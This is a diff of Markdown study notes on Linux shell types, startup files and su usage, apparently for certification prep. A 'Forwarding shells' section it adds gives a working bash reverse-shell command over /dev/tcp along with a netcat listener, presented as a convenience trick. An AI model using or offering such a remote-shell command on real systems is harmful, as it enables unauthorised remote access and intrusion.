@@ -114,7 +114,7 @@ su - user2, su -l user2 or su --login user2
 su user2
 
 #starts an interactive login shell as root.
-su - root or su - inicia um shell de login interativo como root.
+su - root or su
 
 #starts an interactive shell without login as root
 su root ou su
@@ -376,16 +376,83 @@ The .bash_logout file is the individual login shell cleanup file.\
 It is executed when a login shell exits. This file exists in the user's home directory.\
 For example, $HOME/.bash_logout. This file is useful if you want to run task or another script or command automatically at logout. For example, clear the mysql command line history stored in ~/.mysql_history or to make a backup of files you can use this file.
 
-##### Resume of precedence order of execution in files of shell login
-
-![image](https://user-images.githubusercontent.com/62715900/146197143-1fb3071a-0185-4146-98e0-f0f061fa9ade.png)
-
 ##### /etc/adduser.conf
 
 The  file  /etc/adduser.conf contains defaults for the programs adduser(8) , addgroup(8),deluser(8) and delgroup(8).\
 Each line holds a single value pair  in  the  form  option=value.\
 Double or single quotes are allowed around the value, as is whitespace around the equals sign.\
 Comment lines must have a hash sign (#) in the first column.
+
+##### Different shell types: interactive, non-interactive, login
+
+***A login shell***
+
+A login shell is the shell that is run when you log in to a system, either via the terminal or via SSH.
+
+Why is this important?\
+If you run a login shell it executes a number of files on startup.\
+This can influence how your system behaves and you have to put your environment variables in these files.
+The files that are run are
+
+.profile\
+.bash_profile\
+.bash_login
+
+***An interactive shell***
+
+An interactive shell is when you type in the name of the shell after you have logged in to the system.For example:
+
+```sh
+bash
+```
+
+will start an interactive bash shell.
+
+An interactive (bash) shell executes the file .bashrc so you have to put any relevant variables or settings in this file.
+
+***A non-interactive shell***
+
+A non-interactive shell is a shell that can not interact with the user.\
+It’s most often run from a script or similar. This means that .bashrc and .profile are not executed.\
+It is important to note that this often influences your PATH variable.\
+It is always a good practice to use the full path for a command but even more so in non-interactive shells.
+
+Detect the type of shell, BASH only
+You can detect if you are in an interactive or non-interactive shell with
+
+```sh
+[[ $- == *i* ]] && echo 'Interactive' || echo 'not-interactive'
+```
+
+To detect if you are in a login shell or not you have to use the shopt command.
+
+```sh
+shopt -q login_shell && echo 'login' || echo 'not-login'
+shopt | grep login_shell
+```
+
+***Forwarding shells***
+
+One of the most interesting things that you can do with a shell is to forward it to another host.\
+You will need nc or netcat on the host to which you forward the shell.
+
+On the host with the shell you have to issue the command
+
+```sh
+bash -i >& /dev/tcp/192.168.0.135/9999 0>&1
+```
+
+The address 192.168.0.135 is the host to which you want to forward the shell. After the IP (note that you can also use a hostname but I strongly suggest you use an IP to prevent issues with hostname-resolving) you have to put the port number (9999) on which the netcat listener will listen.
+
+You have to start the netcat listener on the other side. Double check that there are no firewall rules preventing you from accepting connections.
+
+```sh
+nc -l 9999
+```
+
+##### Resume of precedence order of execution in files of shell login
+
+![image](https://user-images.githubusercontent.com/62715900/146197143-1fb3071a-0185-4146-98e0-f0f061fa9ade.png)
 
 ### 105.2 Customize or write simple scripts
 
